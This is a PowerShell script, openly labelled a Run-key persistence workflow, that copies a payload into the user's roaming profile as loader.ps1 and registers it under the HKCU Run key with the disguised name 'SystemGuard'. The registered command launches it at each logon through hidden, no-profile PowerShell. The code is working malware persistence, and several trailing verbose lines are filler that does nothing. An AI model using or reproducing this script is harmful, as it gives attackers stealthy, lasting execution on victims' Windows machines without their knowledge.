
<#
.SYNOPSIS
    Run-key persistence workflow.

.DESCRIPTION
    Installs the launcher under the roaming profile,
    writes the Run-key value, then re-reads the value to confirm
    that the registration is present.

.NOTES
    Targets are limited to the current user's profile.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = 'SystemGuard',
    [string]$PersistencePath = "$env:APPDATA\loader.ps1",
    [string]$ActivityLog = "$env:TEMP\transfer.log"
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Payload install
function Install-StagePayload {
    [CmdletBinding()]
    param(
        [string]$SourcePath = '',
        [string]$DestinationPath = ""
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

# Registry write
function Set-RunKeyPersistence {
    param(
        [string]$KeyPath = "",
        [string]$ValueName = "",
        [string]$TargetPath = ''
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $TargetPath + '"') -PropertyType String -Force
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName)
}

try {
    Write-StageLog -Message "Starting persistence stage"
    $InstallResult = Install-StagePayload -SourcePath "$env:APPDATA\payload.bin" -DestinationPath $PersistencePath
    if ($InstallResult) {
        $FetchResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
        Write-StageLog -Message "Run key written"
    }
    else {
        Write-Warning "Payload copy did not complete"
    }
}
catch {
    Write-Warning "Persistence workflow failed: $($_.Exception.Message)"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Preparing working directory"
Write-Verbose "Stage handoff finished"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
